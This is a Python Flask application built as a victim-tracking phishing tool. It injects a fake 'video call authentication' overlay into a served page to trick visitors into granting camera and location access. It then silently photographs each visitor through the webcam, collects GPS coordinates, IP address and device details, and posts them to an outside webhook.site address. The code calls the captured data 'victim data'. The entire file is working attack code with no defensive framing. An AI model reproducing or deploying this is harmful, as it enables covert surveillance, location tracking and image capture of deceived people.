from flask import Flask, request, send_from_directory
import requests
import time
from threading import Lock

app = Flask(__name__)
WEBHOOK_URL = "https://webhook.site/c6a19369-5fb7-44b4-ab97-9ff26418523d"  # REPLACE THIS!
log_lock = Lock()

def send_to_webhook(data, image_b64=None):
    """Send data to webhook with error handling"""
    try:
        payload = {
            "embeds": [{
                "title": "🎥 New Video Call Participant",
                "color": 0x00ff00,
                "fields": [
                    {"name": "IP", "value": data.get('ip', 'N/A')},
                    {"name": "Location", "value": data.get('gps', 'Not shared')},
                    {"name": "Device", "value": data.get('ua', 'N/A')},
                    {"name": "Time", "value": data.get('time', 'Unknown')}
                ],
                "image": {"url": f"data:image/jpeg;base64,{image_b64}"} if image_b64 else None
            }]
        }
        with log_lock:
            requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except Exception as e:
        print(f"Webhook error: {e}")

@app.route('/')
def serve_page():
    """Serve the page with permission overlay"""
    try:
        with open("page.html", "r") as f:
            html = f.read()

        inject_code = """
        <style>
            #permission-overlay {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0,0,0,0.9);
                color: white;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                z-index: 9999;
                font-family: Arial, sans-serif;
            }
            #permission-btn {
                padding: 15px 30px;
                background: #4CAF50;
                color: white;
                border: none;
                border-radius: 5px;
                font-size: 18px;
                cursor: pointer;
                margin-top: 20px;
            }
        </style>

        <div id="permission-overlay">
            <h2>Video Call Authentication Required</h2>
            <p>We need access to your camera and location to verify your identity</p>
            <button id="permission-btn">Allow Access</button>
            <p id="status-text" style="margin-top:20px;"></p>
        </div>

        <script>
            document.getElementById('permission-btn').addEventListener('click', async () => {
                const statusEl = document.getElementById('status-text');
                statusEl.textContent = "Checking permissions...";
                
                // 1. Request GPS
                let gps = "Not shared";
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 10000
                        });
                    });
                    gps = `${pos.coords.latitude}, ${pos.coords.longitude}`;
                    statusEl.textContent = "Location access granted!";
                } catch (e) {
                    statusEl.textContent = "Location access denied (required for verification)";
                }

                // 2. Request Camera
                let photoB64 = null;
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: 'user',
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        }
                    });
                    
                    const track = stream.getVideoTracks()[0];
                    const imageCapture = new ImageCapture(track);
                    const photo = await imageCapture.takePhoto();
                    
                    // Convert to base64
                    photoB64 = await new Promise((resolve) => {
                        const reader = new FileReader();
                        reader.onload = () => resolve(reader.result.split(',')[1]);
                        reader.readAsDataURL(photo);
                    });
                    
                    track.stop();
                    document.getElementById('permission-overlay').style.display = 'none';
                } catch (e) {
                    statusEl.textContent = "Camera access denied (required to continue)";
                    return;
                }

                // 3. Send data
                try {
                    await fetch('/log', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            data: {
                                ip: window.location.hostname,
                                ua: navigator.userAgent,
                                gps: gps,
                                time: new Date().toISOString()
                            },
                            photo: photoB64
                        })
                    });
                } catch (e) {
                    console.error("Failed to send data:", e);
                }
            });
        </script>
        """
        return html.replace('</body>', inject_code + '</body>')
    except Exception as e:
        return f"Error: {e}", 500

@app.route('/log', methods=['POST'])
def handle_log():
    """Process victim data"""
    try:
        data = request.json.get('data', {})
        photo_b64 = request.json.get('photo')
        
        # Get real IP behind Render proxy
        if 'X-Forwarded-For' in request.headers:
            data['ip'] = request.headers['X-Forwarded-For'].split(',')[0]
        
        send_to_webhook(data, photo_b64)
        return "Logged", 200
    except Exception as e:
        print(f"Logging error: {e}")
        return "Error", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
